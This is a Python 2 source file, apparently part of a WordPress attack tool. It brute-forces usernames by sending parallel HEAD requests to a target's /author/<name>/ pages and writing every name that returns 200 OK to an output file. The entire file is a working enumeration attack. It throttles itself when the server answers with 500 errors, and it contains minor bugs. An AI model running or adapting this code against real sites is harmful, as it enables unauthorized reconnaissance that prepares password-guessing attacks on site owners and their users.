import socket, re, itertools, ssl
from time import sleep
from os import strerror
from multiprocessing import Pool, Lock, active_children

global lock
lock = Lock()

class BruteUser(object):
	def __init__(self,username):
		self.username = username

	def run(self):
		self.donothing = 0
		self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		if (secure == 1):	self.ssocket = ssl.wrap_socket(self.s)
		else:	self.ssocket = self.s
		self.connmsg = self.ssocket.connect_ex((host,port))
		while (self.connmsg != 0):
			print("ERROR:\t%s" % strerror(self.connmsg))
			sleep(2.1)
			self.connmsg = self.ssocket.connect_ex((host,port))
		self.ssocket.send("HEAD "+path+"author/"+self.username+"/ HTTP/1.1\r\nHost: "+host+"\r\n\r\n")
		self.chunk = self.ssocket.recv(20)
		while (len(self.chunk) < 20):
			sleep(1)
			self.chunk += self.ssocket.recv(20)
		self.ssocket.close()
		if (self.chunk.find("200 OK") > 0):
			print("Valid user found:\t%s" % self.username)
			lock.acquire()
			f = open(userout,"a")
			f.write(self.username+"\n")
			f.close()
			lock.release()
		elif (self.chunk.find("500") > 0):
			print("500 Internal Server Error seen, you may be sending too fast!")
			return 1
		elif (self.chunk.find("404") > 0):	self.donothing = 1
		else:
			print("Irregular server response seen.\n%s" % str(chunk))
			return 1
		return 0

def worker(users):
	for user in users:
		user = str(user.strip("\n"))
		#print("Trying %s" % user)
		while (BruteUser(user).run() != 0):	sleep(1)
	
def grouper(iterable,n,fillvalue=None):
    it = iter(iterable)
    def take():
        while 1: yield list(itertools.islice(it,n))
    return iter(take().next,[])

def bruteUser(userlist,psize,hosti,pathi,porti,securei,userfound):
	global host
	host = hosti
	global port
	port = porti
	global secure
	secure = securei
	global userout
	userout = userfound
	global path
	path = pathi
	f = open(userout,'w').close()
	usersize = len(userlist)
	# manage pool
	if (psize == 0):	psize = 5
	if (usersize <= psize):	chunksize = 1
	else:	chunksize = ((usersize / psize) + (usersize % psize))
	print("Userlist size: %d\tChunk size: %d\tPool size: %d" % (usersize,chunksize,psize))
	print("Bruteforcing usernames")
	pool = Pool(processes=psize)
        for chunk in itertools.izip(grouper(userlist,chunksize)):  pool.map_async(worker,chunk)
        pool.close()
        try:
                while(len(active_children()) > 0): # how many active children do we have
                        sleep(2)
                        ignore = active_children()
        except KeyboardInterrupt:       exit('CTRL^C caught, exiting...\n\n')
	print("Username bruteforce complete")
